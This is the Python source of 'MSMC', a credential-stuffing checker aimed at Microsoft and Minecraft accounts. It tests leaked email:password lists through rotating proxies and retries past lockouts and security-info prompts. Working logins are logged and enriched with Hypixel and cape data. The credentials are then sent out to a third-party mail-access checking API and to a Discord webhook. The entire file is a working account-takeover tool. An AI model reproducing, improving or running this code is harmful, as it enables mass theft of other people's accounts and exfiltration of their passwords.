import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, traceback, warnings
from datetime import datetime, timezone
from colorama import Fore
from console import utils
from tkinter import filedialog
from urllib.parse import urlparse, parse_qs

logo = Fore.GREEN+'''
     ███▄ ▄███▓  ██████  ███▄ ▄███▓ ▄████▄  
    ▓██▒▀█▀ ██▒▒██    ▒ ▓██▒▀█▀ ██▒▒██▀ ▀█  
    ▓██    ▓██░░ ▓██▄   ▓██    ▓██░▒▓█    ▄ 
    ▒██    ▒██   ▒   ██▒▒██    ▒██ ▒▓▓▄ ▄██▒
    ▒██▒   ░██▒▒██████▒▒▒██▒   ░██▒▒ ▓███▀ ░
    ░ ▒░   ░  ░▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░ ░▒ ▒  ░
    ░  ░      ░░ ░▒  ░ ░░  ░      ░  ░  ▒   
    ░      ░   ░  ░  ░  ░      ░   ░        
           ░         ░         ░   ░ ░      
                                   ░        \n'''
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000004C12AE6F" \
             "&redirect_uri=https://login.live.com/oauth20_desktop.srf" \
             "&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
fname = ""
hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,bedrock = 0,0,0,0,0,0,0,0,0,0,0,0,0
urllib3.disable_warnings() #spams warnings because i send unverified requests for debugging purposes
warnings.filterwarnings("ignore") #spams python warnings on some functions, i may be using some outdated things...

class Config:
    def __init__(self):
        self.data = {}

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)

config = Config()

class Capture:
    def __init__(self, email, password, name, capes, token):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.token = token
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.capes = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.namechanged = None
        self.lastchanged = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}"
        if self.hypixl != None: message+=f"\nHypixel: {self.hypixl}"
        if self.level != None: message+=f"\nHypixel Level: {self.level}"
        if self.firstlogin != None: message+=f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin != None: message+=f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape != None: message+=f"\nOptifine Cape: {self.cape}"
        if self.access != None: message+=f"\nEmail Access: {self.access}"
        if self.sbcoins != None: message+=f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars != None: message+=f"\nHypixel Bedwars Stars: {self.bwstars}"
        if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
        return message+"\n============================\n"

    def notify(self):
        global errors
        try:
            payload = {
                "content": config.get('message')
                    .replace("<email>", self.email)
                    .replace("<password>", self.password)
                    .replace("<name>", self.name or "N/A")
                    .replace("<hypixel>", self.hypixl or "N/A")
                    .replace("<level>", self.level or "N/A")
                    .replace("<firstlogin>", self.firstlogin or "N/A")
                    .replace("<lastlogin>", self.lastlogin or "N/A")
                    .replace("<ofcape>", self.cape or "N/A")
                    .replace("<capes>", self.capes or "N/A")
                    .replace("<access>", self.access or "N/A")
                    .replace("<skyblockcoins>", self.sbcoins or "N/A")
                    .replace("<bedwarsstars>", self.bwstars or "N/A")
                    .replace("<namechange>", self.namechanged or "N/A")
                    .replace("<lastchanged>", self.lastchanged or "N/A"),
                "username": "MSMC"
            }
            requests.post(config.get('webhook'), data=json.dumps(payload), headers={"Content-Type": "application/json"})
        except: pass

    def hypixel(self):
        global errors
        try:
            if config.get('hypixelname') is True or config.get('hypixellevel') is True or config.get('hypixelfirstlogin') is True or config.get('hypixellastlogin') is True or config.get('hypixelbwstars') is True:
                tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, proxies=getproxy(), headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
                try: 
                    if config.get('hypixelname') is True: self.hypixl = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
                except: pass
                try: 
                    if config.get('hypixellevel') is True: self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelfirstlogin') is True: self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixellastlogin') is True: self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelbwstars') is True: self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: pass
            if config.get('hypixelsbcoins') is True:
                try:
                    req = requests.get("https://sky.shiiyu.moe/stats/"+self.name, proxies=getproxy(), verify=False) #didnt use the api here because this is faster ¯\_(ツ)_/¯
                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: pass
        except: errors+=1

    def optifine(self):
        if config.get('optifinecape') is True:
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy(), verify=False).text
                if "Not found" in txt: self.cape = "No"
                else: self.cape = "Yes"
            except: self.cape = "Unknown"

    def full_access(self):
        global mfa, sfa
        if config.get('access') is True:
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text) #my mailaccess checking api pls dont rape or it will go offline prob (weak hosting)
                if out["Success"] == 1: 
                    self.access = "True"
                    mfa+=1
                    open(f"results/{fname}/MFA.txt", 'a').write(f"{self.email}:{self.password}\n")
                else:
                    sfa+=1
                    self.access = "False"
                    open(f"results/{fname}/SFA.txt", 'a').write(f"{self.email}:{self.password}\n")
            except: self.access = "Unknown"
    
    def namechange(self):
        if config.get('namechange') is True or config.get('lastchanged') is True:
            try:
                check = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, proxies=getproxy(), verify=False)
                if check.status_code == 200:
                    data = check.json()
                    if config.get('namechange') is True:
                        self.namechanged = str(data['nameChangeAllowed'])
                    if config.get('lastchanged') is True:
                        given_date = datetime.strptime(data['createdAt'], "%Y-%m-%dT%H:%M:%S.%fZ").replace(tzinfo=timezone.utc)
                        formatted = given_date.strftime("%m/%d/%Y")
                        current_date = datetime.now(timezone.utc)
                        difference = current_date - given_date
                        years = difference.days // 365
                        months = difference.days % 365 // 30
                        days = difference.days
                        if years > 0:
                            return f"{years} {'year' if years == 1 else 'years'} - {formatted} - {data['createdAt']}"
                        elif months > 0:
                            return f"{months} {'month' if months == 1 else 'months'} - {formatted} - {data['createdAt']}"
                        else:
                            self.lastchanged = f"{difference.days} {'day' if days == 1 else 'days'} - {formatted} - {data['createdAt']}"
                if check.status_code == 429:
                    Capture.namechange(self)
            except:
                Capture.namechange(self)
    
    def handle(self):
        global hits, mfa, sfa, cpm, checked
        if screen == "'2'": print(Fore.GREEN+f"Hit: {self.name} | {self.email}:{self.password}")
        hits+=1
        with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{self.email}:{self.password}\n")
        Capture.hypixel(self)
        Capture.optifine(self)
        Capture.full_access(self)
        Capture.namechange(self)
        open(f"results/{fname}/Capture.txt", 'a').write(Capture.builder(self))
        Capture.notify(self)

def get_urlPost_sFTTag(session):
    global retries
    while True: #will retry forever until it gets a working request.
        try:
            r = session.get(sFTTag_url, timeout=15)
            text = r.text
            match = re.match(r'.*value="(.+?)".*', text, re.S)
            if match is not None:
                sFTTag = match.group(1)
                match = re.match(r".*urlPost:'(.+?)'.*", text, re.S)
                if match is not None:
                    return match.group(1), sFTTag, session
        except: pass
        session.proxy = getproxy()
        retries+=1

def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
    global bad, checked, cpm, twofa, retries, checked
    try:
        data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
        login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
        if '#' in login_request.url and login_request.url != sFTTag_url:
            #print(login_request.url)
            token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
            if token != "None":
                return token, session
            else:
                if tries < maxretries:
                    session.proxy = getproxy()
                    retries+=1
                    tries+=1
                    return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
                else:
                    bad+=1
                    checked+=1
                    cpm+=1
                    if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                    return "None", session
        #sec info change
        elif 'cancel?mkt=' in login_request.text:
            data = {'ipt':re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(), 'pprid':re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(), 'uaid':re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()}
            ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
            fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
            token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
            if token != "None":
                return token, session
            else:
                if tries < maxretries:
                    session.proxy = getproxy()
                    retries+=1
                    tries+=1
                    return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
                else:
                    bad+=1
                    checked+=1
                    cpm+=1
                    if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                    return "None", session
        elif "tried to sign in too many times with an incorrect account or password." in login_request.text:
            if tries < maxretries:
                session.proxy = getproxy()
                retries+=1
                tries+=1
                #if screen == "'2'": print(Fore.LIGHTRED_EX+f"Blocked, retrying: {email}:{password} {Fore.LIGHTBLACK_EX}[{str(tries)}/{str(maxretries)}]")
                return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
            else:
                bad+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                return "None", session
        #2fa
        elif any(value in login_request.text for value in ["recover?mkt" , "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
            twofa+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
            with open(f"results/{fname}/2fa.txt", 'a') as file: file.write(f"{email}:{password}\n")
            return "None", session
        #bad
        elif any(value in login_request.text for value in ["Your account or password is incorrect." , "That Microsoft account doesn't exist. Enter a different account" , "Sign in to your Microsoft account" ]):
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
            return "None", session
        #blocked, retry
        else:
            if tries < maxretries:
                session.proxy = getproxy()
                retries+=1
                tries+=1
                return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
            else:
                bad+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                return "None", session
    except:
        if tries < maxretries:
            session.proxy = getproxy()
            retries+=1
            tries+=1
            return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
        else:
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
            return "None", session

def validmail(email, password):
    global vm, cpm, checked
    vm+=1
    cpm+=1
    checked+=1
    with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
    if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Valid Mail: {email}:{password}")

def checkmc(session, email, password, token):
    global retries, bedrock, cpms, checked
    checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False)
    if checkrq.status_code == 200:
        if 'game_minecraft' in checkrq.text or 'product_minecraft' in checkrq.text:
            if 'game_minecraft_bedrock' in checkrq.text:
                bedrock+=1
                cpm+=1
                checked+=1
                with open(f"results/{fname}/Bedrock.txt", 'a') as file: file.write(f"{email}:{password}\n")
                if screen == "'2'": print(Fore.LIGHTYELLOW_EX+f"Minecraft Bedrock: {email}:{password}")
            else:
                CAPTURE = Capture(email, password, "N/A", "N/A", token)
                CAPTURE.handle()
                return True
    if checkrq.status_code == 429:
        retries+=1
        session.proxy = getproxy()
        return checkmc(session, email, password, token)
    return False


def account(access_token, session):
    global retries
    try:
        r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False)
        capes = ""
        if r.status_code == 200:
            try:
                capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
            except: capes = "Unknown"
            return r.json()['name'], capes
        if r.status_code == 429:
            retries+=1
            session.proxy = getproxy()
            return account(access_token, session)
        else:
            return None, None
    except:
        retries+=1
        session.proxy = getproxy()
        return account(access_token, session)

def mclogin(session, email, password, uhs, xsts_token):
    global retries
    try:
        mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
        if mc_login.status_code == 429:
            session.proxy = getproxy()
            return mclogin(session, email, password, uhs, xsts_token)
        else:
            access_token = mc_login.json().get('access_token')
            if access_token != None:
                name, capes = account(access_token, session)
                if name != None:
                    CAPTURE = Capture(email, password, name, capes, access_token)
                    CAPTURE.handle()
                    return True
                else:
                    return checkmc(session, email, password, access_token)
            else: return False
    except:
        retries+=1
        session.proxy = getproxy()
        return mclogin(session, email, password, uhs, xsts_token)

def authenticate(email, password, tries = 0):
    global retries, bad, checked, cpm
    try:
        session = requests.Session()
        session.verify = False
        session.proxies = getproxy()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token != "None":
            hit = False
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if xbox_token != None:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token != None:
                        hit = mclogin(session, email, password, uhs, xsts_token)
            except: pass
            if hit == False: validmail(email, password)
    except Exception as e:
        #print(e)
        #traceback.print_exc()
        #line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
        #print("Exception occurred at line:", line_number)
        if tries < maxretries:
            tries+=1
            retries+=1
            authenticate(email, password, tries)
        else:
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")


def Load():
    global Combos, fname
    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if filename is None:
        print(Fore.LIGHTRED_EX+"Invalid File.")
        time.sleep(2)
        Load()
    else:
        fname = os.path.splitext(os.path.basename(filename.name))[0]
        try:
            with open(filename.name, 'r+', encoding='utf-8') as e:
                lines = e.readlines()
                Combos = list(set(lines))
                print(Fore.LIGHTBLUE_EX+f"[{str(len(lines) - len(Combos))}] Dupes Removed.")
                print(Fore.LIGHTBLUE_EX+f"[{len(Combos)}] Combos Loaded.")
        except:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            time.sleep(2)
            Load()

def Proxys():
    global proxylist
    fileNameProxy = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameProxy is None:
        print(Fore.LIGHTRED_EX+"Invalid File.")
        time.sleep(2)
        Proxys()
    else:
        try:
            with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        proxylist.append(proxyline)
                    except: pass
            print(Fore.LIGHTBLUE_EX+f"Loaded [{len(proxylist)}] lines.")
            time.sleep(2)
        except Exception:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            time.sleep(2)
            Proxys()

def logscreen():
    global cpm, cpm1
    cmp1 = cpm
    cpm = 0
    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Valid Mail: {vm}  -  Bedrock: {bedrock}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=logscreen, args=()).start()    

def cuiscreen():
    global cpm, cpm1
    os.system('cls')
    cmp1 = cpm
    cpm = 0
    print(logo)
    print(f" [{checked}\{len(Combos)}] Checked")
    print(f" [{hits}] Hits")
    print(f" [{bad}] Bad")
    print(f" [{sfa}] SFA")
    print(f" [{mfa}] MFA")
    print(f" [{twofa}] 2FA")
    print(f" [{vm}] Valid Mail")
    print(f" [{retries}] Retries")
    print(f" [{errors}] Errors")
    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Valid Mail: {vm}  -  Bedrock: {bedrock}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=cuiscreen, args=()).start()

def finishedscreen():
    #os.system('cls')
    print(logo)
    print()
    print(Fore.LIGHTGREEN_EX+"Finished Checking!")
    print()
    print("Hits: "+str(hits))
    print("Bad: "+str(bad))
    print("SFA: "+str(sfa))
    print("MFA: "+str(mfa))
    print("2FA: "+str(twofa))
    print("Bedrock: "+str(bedrock))
    print("Valid Mail: "+str(vm))
    print(Fore.LIGHTRED_EX+"Press any key to exit.")
    repr(readchar.readkey())
    os.abort()

def getproxy():
    if proxytype == "'5'": return random.choice(proxylist)
    if proxytype != "'4'": 
        proxy = random.choice(proxylist)
        if proxytype  == "'1'": return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype  == "'2'": return {'http': 'socks4://'+proxy,'https': 'socks4://'+proxy}
        elif proxytype  == "'3'" or proxytype  == "'4'": return {'http': 'socks5://'+proxy,'https': 'socks5://'+proxy}
    else: return None

def Checker(combo):
    global bad, checked, cpm
    try:
        email, password = combo.strip().replace(' ', '').split(":")
        if email != "" and password != "":
            authenticate(str(email), str(password))
        else:
            if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
            bad+=1
            cpm+=1
            checked+=1
    except:
        if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
        bad+=1
        cpm+=1
        checked+=1

def loadconfig():
    global maxretries
    if not os.path.isfile("config.ini"):
        c = configparser.ConfigParser(allow_no_value=True)
        c['Settings'] = {
            'Webhook': 'paste your discord webhook here',
            'Max Retries': '5',
            'WebhookMessage': '''@everyone HIT: ||`<email>:<password>`||
Name: <name>
Hypixel: <hypixel>
Hypixel Level: <level>
First Hypixel Login: <firstlogin>
Last Hypixel Login: <lastlogin>
Optifine Cape: <ofcape>
MC Capes: <capes>
Email Access: <access>
Hypixel Skyblock Coins: <skyblockcoins>
Hypixel Bedwars Stars: <bedwarsstars>
Can Change Name: <namechange>
Last Name Change: <lastchanged>'''}
        c['Scraper'] = {
            'Auto Scrape Minutes': 5
        }
        c['Captures'] = {
            'Hypixel Name': True,
            'Hypixel Level': True,
            'First Hypixel Login': True,
            'Last Hypixel Login': True,
            'Optifine Cape': True,
            'Minecraft Capes': True,
            'Email Access': True,
            'Hypixel Skyblock Coins': True,
            'Hypixel Bedwars Stars': True,
            'Name Change Availability': False,
            'Last Name Change': False
        }
        with open('config.ini', 'w') as configfile:
            c.write(configfile)
    read_config = configparser.ConfigParser()
    read_config.read('config.ini')
    maxretries = int(read_config['Settings']['max retries'])
    config.set('webhook', str(read_config['Settings']['webhook']))
    config.set('message', str(read_config['Settings']['webhookmessage']))
    config.set('autoscrape', int(read_config['Scraper']['auto scrape minutes']))
    config.set('hypixelname', bool(read_config['Captures']['hypixel name']))
    config.set('hypixellevel', bool(read_config['Captures']['hypixel level']))
    config.set('hypixelfirstlogin', bool(read_config['Captures']['first hypixel login']))
    config.set('hypixellastlogin', bool(read_config['Captures']['last hypixel login']))
    config.set('optifinecape', bool(read_config['Captures']['optifine cape']))
    config.set('mcapes', bool(read_config['Captures']['minecraft capes']))
    config.set('access', bool(read_config['Captures']['email access']))
    config.set('hypixelsbcoins', bool(read_config['Captures']['hypixel skyblock coins']))
    config.set('hypixelbwstars', bool(read_config['Captures']['hypixel bedwars stars']))
    config.set('namechange', bool(read_config['Captures']['name change availability']))
    config.set('lastchanged', bool(read_config['Captures']['last name change']))

def get_proxies():
    global proxylist
    http = []
    socks4 = []
    socks5 = []
    api_http = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt" #JUST SO YOU KNOW YOU CANNOT PUT ANY PAGE WITH PROXIES HERE UNLESS ITS JUST PROXIES ON THE PAGE, TO SEE WHAT I MEAN VISIT THE WEBSITES
    ]
    api_socks4 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt" #JUST SO YOU KNOW YOU CANNOT PUT ANY PAGE WITH PROXIES HERE UNLESS ITS JUST PROXIES ON THE PAGE, TO SEE WHAT I MEAN VISIT THE WEBSITES
    ]
    api_socks5 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt" #JUST SO YOU KNOW YOU CANNOT PUT ANY PAGE WITH PROXIES HERE UNLESS ITS JUST PROXIES ON THE PAGE, TO SEE WHAT I MEAN VISIT THE WEBSITES
    ]
    for service in api_http:
        http.extend(requests.get(service).text.splitlines())
    for service in api_socks4: 
        socks4.extend(requests.get(service).text.splitlines())
    for service in api_socks5: 
        socks5.extend(requests.get(service).text.splitlines())
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks4&limit=500").json().get('data'):
            socks4.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500").json().get('data'):
            socks5.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    http = list(set(http))
    socks4 = list(set(socks4))
    socks5 = list(set(socks5))
    proxylist.clear()
    for proxy in http: proxylist.append({'http': 'http://'+proxy, 'https': 'http://'+proxy})
    for proxy in socks4: proxylist.append({'http': 'socks4://'+proxy,'https': 'socks4://'+proxy})
    for proxy in socks5: proxylist.append({'http': 'socks5://'+proxy,'https': 'socks5://'+proxy})
    if screen == "'2'": print(Fore.LIGHTBLUE_EX+f'Scraped [{len(proxylist)}] proxies')
    time.sleep(config.get('autoscrape') * 60)
    get_proxies()

def Main():
    global proxytype, screen
    utils.set_title("MSMC by KillinMachine")
    os.system('cls')
    try:
        loadconfig()
    except:
        print(Fore.RED+"There was an error loading the config. Perhaps you're using an older config? If so please delete the old config and reopen MSMC.")
        input()
        exit()
    print(logo)
    try:
        print(Fore.LIGHTBLACK_EX+"(speed for checking, i recommend 100, give more threads if its slow. if proxyless give at most 5 threads.)")
        thread = int(input(Fore.LIGHTBLUE_EX+"Threads: "))
    except:
        print(Fore.LIGHTRED_EX+"Must be a number.") 
        time.sleep(2)
        Main()
    print(Fore.LIGHTBLUE_EX+"Proxy Type: [1] Http\s - [2] Socks4 - [3] Socks5 - [4] None - [5] Auto Scraper")
    proxytype = repr(readchar.readkey())
    cleaned = int(proxytype.replace("'", ""))
    if cleaned not in range(1, 6):
        print(Fore.RED+f"Invalid Proxy Type [{cleaned}]")
        time.sleep(2)
        Main()
    print(Fore.LIGHTBLUE_EX+"Screen: [1] CUI - [2] Log")
    screen = repr(readchar.readkey())
    print(Fore.LIGHTBLUE_EX+"Select your combos")
    Load()
    if proxytype != "'4'" and proxytype != "'5'":
        print(Fore.LIGHTBLUE_EX+"Select your proxies")
        Proxys()
    if proxytype =="'5'":
        print(Fore.LIGHTGREEN_EX+"Scraping Proxies Please Wait.")
        threading.Thread(target=get_proxies, args=()).start()
        while len(proxylist) == 0: 
            time.sleep(1)
    if not os.path.exists("results"): os.makedirs("results/")
    if not os.path.exists('results/'+fname): os.makedirs('results/'+fname)
    if screen == "'1'": cuiscreen()
    elif screen == "'2'": logscreen()
    else: cuiscreen()
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        futures = [executor.submit(Checker, combo) for combo in Combos]
        concurrent.futures.wait(futures)
    finishedscreen()
    input()
Main()
